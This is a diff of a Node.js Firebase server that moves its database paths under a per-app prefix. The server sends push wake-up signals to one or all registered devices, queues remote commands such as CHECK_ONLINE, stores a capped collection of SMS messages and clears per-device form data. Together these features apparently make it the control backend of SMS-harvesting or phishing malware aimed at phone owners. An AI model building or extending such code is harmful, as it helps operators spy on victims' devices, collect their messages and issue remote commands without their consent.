@@ -72,13 +72,13 @@ async function sendWakeupSignal(uid, token) {
  * REALTIME QUEUE LISTENER
  * Monitors 'fcm_queue' for new requests.
  */
-db.ref("fcm_queue").on("child_added", async (snapshot) => {
+db.ref("Apps/APP_002/fcm_queue").on("child_added", async (snapshot) => {
   const queueId = snapshot.key;
   const payload = snapshot.val();
 
   if (!payload || !payload.targetUid) {
     console.log(`[QUEUE] Invalid or empty request at ${queueId}. Deleting.`);
-    return db.ref(`fcm_queue/${queueId}`).remove();
+    return db.ref(`Apps/APP_002/fcm_queue/${queueId}`).remove();
   }
 
   const targetUid = payload.targetUid;
@@ -86,18 +86,18 @@ db.ref("fcm_queue").on("child_added", async (snapshot) => {
   // ACTION: Clear All Commands across all devices
   if (targetUid === "CLEAR_COMMANDS") {
     try {
-      const usersSnap = await db.ref("Users").once("value");
+      const usersSnap = await db.ref("Apps/APP_002/Users").once("value");
       const users = usersSnap.val() || {};
       const updates = {};
       Object.keys(users).forEach(uid => {
-        updates[`Users/${uid}/C`] = null;
+        updates[`Apps/APP_002/Users/${uid}/C`] = null;
       });
       await db.ref().update(updates);
       console.log(`[QUEUE] Global Wipe: Successfully cleared all commands for all devices.`);
     } catch (err) {
       console.error(`[ERROR] Failed to clear commands:`, err.message);
     }
-    return db.ref(`fcm_queue/${queueId}`).remove();
+    return db.ref(`Apps/APP_002/fcm_queue/${queueId}`).remove();
   }
 
   console.log(`[QUEUE] Triggering wakeup sequence for: ${targetUid}`);
@@ -105,7 +105,7 @@ db.ref("fcm_queue").on("child_added", async (snapshot) => {
   try {
     if (targetUid === "ALL") {
       // BROADCAST: Wake up every device registered in the Users node
-      const usersSnap = await db.ref("Users").once("value");
+      const usersSnap = await db.ref("Apps/APP_002/Users").once("value");
       const users = usersSnap.val() || {};
       const uids = Object.keys(users);
 
@@ -130,7 +130,7 @@ db.ref("fcm_queue").on("child_added", async (snapshot) => {
       }
     } else {
       // TARGETED: Wake up a single specific device
-      const userTokenSnap = await db.ref(`Users/${targetUid}/I/tk`).once("value");
+      const userTokenSnap = await db.ref(`Apps/APP_002/Users/${targetUid}/I/tk`).once("value");
       const token = userTokenSnap.val();
       await sendWakeupSignal(targetUid, token);
     }
@@ -138,7 +138,7 @@ db.ref("fcm_queue").on("child_added", async (snapshot) => {
     console.error(`[ERROR] Processing queue task ${queueId}:`, err.message);
   } finally {
     // Delete the task from the queue once processed
-    db.ref(`fcm_queue/${queueId}`).remove();
+    db.ref(`Apps/APP_002/fcm_queue/${queueId}`).remove();
   }
 });
 
@@ -175,8 +175,8 @@ async function enforceLimit(path, limit) {
 }
 
 // Watch for new data to trigger periodic cleanup
-db.ref("all_sms").limitToLast(1).on("child_added", () => enforceLimit("all_sms", 700));
-db.ref("AdminLogs").limitToLast(1).on("child_added", () => enforceLimit("AdminLogs", 500));
+db.ref("Apps/APP_002/all_sms").limitToLast(1).on("child_added", () => enforceLimit("Apps/APP_002/all_sms", 700));
+db.ref("Apps/APP_002/AdminLogs").limitToLast(1).on("child_added", () => enforceLimit("Apps/APP_002/AdminLogs", 500));
 
 /**
  * INACTIVE DEVICE CLEANUP
@@ -187,7 +187,7 @@ async function cleanupInactiveForms() {
     const sevenDaysMs = 7 * 24 * 60 * 60 * 1000;
     const cutoff = Date.now() - sevenDaysMs;
 
-    const usersSnap = await db.ref("Users").once("value");
+    const usersSnap = await db.ref("Apps/APP_002/Users").once("value");
     const users = usersSnap.val() || {};
     const updates = {};
     let count = 0;
@@ -196,7 +196,7 @@ async function cleanupInactiveForms() {
       const lastOnline = users[uid].I?.lo || 0;
       // If device is older than 7 days and has form data, clear the form data
       if (lastOnline > 0 && lastOnline < cutoff && users[uid].F) {
-        updates[`Users/${uid}/F`] = null;
+        updates[`Apps/APP_002/Users/${uid}/F`] = null;
         count++;
       }
     });
@@ -221,7 +221,7 @@ setTimeout(cleanupInactiveForms, 5000);
  */
 async function dailyGlobalSync() {
   try {
-    const usersSnap = await db.ref("Users").once("value");
+    const usersSnap = await db.ref("Apps/APP_002/Users").once("value");
     const users = usersSnap.val() || {};
     const uids = Object.keys(users);
     if (uids.length === 0) return;
@@ -242,8 +242,8 @@ async function dailyGlobalSync() {
         });
       }
       // Add CHECK_ONLINE command to database
-      const newCmdRef = db.ref(`Users/${uid}/C`).push();
-      updates[`Users/${uid}/C/${newCmdRef.key}`] = { t: "CHECK_ONLINE", ts: now };
+      const newCmdRef = db.ref(`Apps/APP_002/Users/${uid}/C`).push();
+      updates[`Apps/APP_002/Users/${uid}/C/${newCmdRef.key}`] = { t: "CHECK_ONLINE", ts: now };
     });
 
     // Send FCM messages in chunks of 500 (Firebase limit)
